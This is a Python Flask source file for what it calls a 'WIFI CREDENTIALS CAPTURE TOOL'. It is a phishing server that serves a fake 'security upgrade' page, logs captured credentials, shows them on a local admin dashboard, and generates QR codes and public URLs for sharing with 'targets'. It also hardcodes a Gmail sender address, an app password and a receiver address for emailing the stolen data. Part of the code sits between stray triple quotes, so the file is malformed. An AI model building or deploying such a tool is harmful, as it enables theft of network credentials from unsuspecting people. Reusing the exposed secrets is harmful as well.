from flask import Flask, render_template, request, redirect, url_for
import smtplib
from email.mime.text import MIMEText
import ssl
import os
import socket
import qrcode
from io import BytesIO
import base64
from datetime import datetime
import webbrowser
import requests
import threading
import time
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Email configuration - REPLACE WITH YOUR VALUES
EMAIL_SENDER = 'yooptxx@gmail.com'  # Your Gmail address
EMAIL_PASSWORD = 'pixkdauqdmohgyid'   # Use an App Password (not your Gmail password)
EMAIL_RECEIVER = 'methullakvindu5@gmail.com'  # Where to send the data

# Function to create a QR code for the URL
def create_qr_code(url):
    try:
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(url)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        buffered = BytesIO()
        img.save(buffered)
        img_str = base64.b64encode(buffered.getvalue()).decode()
        return f"data:image/png;base64,{img_str}"
    except Exception as e:
        logger.error(f"Error creating QR code: {str(e)}")
        return None

# Function to get public IP using an external service
def get_public_ip():
    try:
        ip = requests.get('https://api.ipify.org').text
        return ip
    except:
        try:
            ip = requests.get('https://icanhazip.com').text.strip()
            return ip
        except:
            try:
                ip = requests.get('https://ifconfig.me/ip').text.strip()
                return ip
            except:
                return None

# Function to get all IP addresses of the server
def get_ip_addresses():
    ip_addresses = []
    try:
        # Get hostname
        hostname = socket.gethostname()
        # Get local IP by hostname
        local_ip = socket.gethostbyname(hostname)
        if local_ip and local_ip != '127.0.0.1' and local_ip not in ip_addresses:
            ip_addresses.append(local_ip)
        
        # Try to get all network interfaces
        try:
            # For more accurate network interfaces scanning
            import netifaces
            for interface in netifaces.interfaces():
                addresses = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addresses:
                    for link in addresses[netifaces.AF_INET]:
                        ip = link['addr']
                        # Skip localhost
                        if ip != '127.0.0.1':
                            if ip not in ip_addresses:
                                ip_addresses.append(ip)
        except ImportError:
            # Fallback method if netifaces is not available
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                # Doesn't need to be reachable
                s.connect(('10.255.255.255', 1))
                ip = s.getsockname()[0]
                if ip not in ip_addresses and ip != '127.0.0.1':
                    ip_addresses.append(ip)
            except:
                pass
            finally:
                s.close()
    except Exception as e:
        logger.error(f"Error getting IP addresses: {str(e)}")
    
    return ip_addresses

# Route for the dashboard to monitor and display access URLs
@app.route('/admin', methods=['GET'])
def admin():
    # Only allow access from localhost for security
    if request.remote_addr not in ['127.0.0.1', '::1', 'localhost']:
        return "Access denied", 403
        
    # Get all available IP addresses
    local_ips = get_ip_addresses()
    public_ip = get_public_ip()
    
    urls = []
    qr_codes = {}
    
    # Add local URLs
    for ip in local_ips:
        url = f"http://{ip}:{PORT}"
        urls.append(url)
        qr_codes[url] = create_qr_code(url)
    
    # Add public URL if available
    if public_ip:
        public_url = f"http://{public_ip}:{PORT}"
        if public_url not in urls:
            urls.append(public_url)
            qr_codes[public_url] = create_qr_code(public_url)
    
    # Get logs if available
    logs = []
    log_path = os.path.join("logs", "captured_credentials.log")
    if os.path.exists(log_path):
        try:
            with open(log_path, "r") as f:
                logs = f.read().split("\n\n--- NEW CAPTURE:")
                if logs and not logs[0].strip():
                    logs.pop(0)
                logs = ["--- NEW CAPTURE:" + log if i > 0 else log for i, log in enumerate(logs)]
        except:
            logs = ["Error reading logs"]
    
    return render_template('admin.html', urls=urls, qr_codes=qr_codes, logs=logs)

# Route to display the form
'''''

# Success page - show a more convincing "security upgrade" message
@app.route('/success')
def success():
    return render_template('success.html')

def open_browser():
    """Open the admin page in the default browser after a short delay"""
    time.sleep(1)
    webbrowser.open(f'http://127.0.0.1:{PORT}/admin')

# Main entry point with more detailed error handling
if __name__ == '__main__':
    # Define the port - if 5000 is busy, try 8080 as fallback
    PORT = 5000
    
    # Try to create the log directory
    try:
        if not os.path.exists("logs"):
            os.makedirs("logs")
    except Exception as e:
        logger.error(f"Error creating log directory: {str(e)}")
    
    # Try to create the templates directory if it doesn't exist
    try:
        if not os.path.exists("templates"):
            os.makedirs("templates")
            logger.warning("Created 'templates' directory - please make sure to place your template files there")
    except Exception as e:
        logger.error(f"Error creating templates directory: {str(e)}")
    
    # Check if required template files exist
    required_templates = ['index.html']
    missing_templates = []
    
    for template in required_templates:
        template_path = os.path.join("templates", template)
        if not os.path.exists(template_path):
            missing_templates.append(template)
    
    if missing_templates:
        logger.critical(f"Missing required template files: {', '.join(missing_templates)}")
        logger.critical("Please make sure all template files are in the 'templates' directory")
        logger.critical("The application cannot start without these files")
        exit(1)
    
    # Open the admin page in the browser
    threading.Thread(target=open_browser).start()
    
    # Try to run the Flask app
    try:
        print("\n" + "="*80)
        print(" WIFI CREDENTIALS CAPTURE TOOL STARTED ".center(80, '='))
        print("="*80)
        
        # Get IPs for display
        ip_addresses = get_ip_addresses()
        public_ip = get_public_ip()
        
        if ip_addresses:
            print("\nLocal network access URLs (for devices on the same network):")
            for ip in ip_addresses:
                print(f"http://{ip}:{PORT}")
        
        if public_ip:
            print("\nPotential public access URL (may require port forwarding):")
            print(f"http://{public_ip}:{PORT}")
        
        print("\nAdmin dashboard: http://127.0.0.1:{PORT}/admin")
        print("\nOpening admin dashboard in your browser...")
        
        print("\nTo share with targets:")
        print("1. Use any of the local network URLs for devices on the same network")
        print("2. For accessing outside your network, set up port forwarding on your router")
        
        print("="*80 + "\n")
        
        # Run the Flask app
        app.run(debug=True, host='0.0.0.0', port=PORT, threaded=True)
        
    except OSError as e:
        if "Address already in use" in str(e):
            logger.critical(f"Port {PORT} is already in use.")
            logger.critical("Try stopping other applications that might be using this port or change the PORT value.")
            exit(1)
        else:
            logger.critical(f"Error starting server: {str(e)}")
            exit(1)
    except Exception as e:
        logger.critical(f"Unexpected error starting server: {str(e)}")
        exit(1)
        
        ''''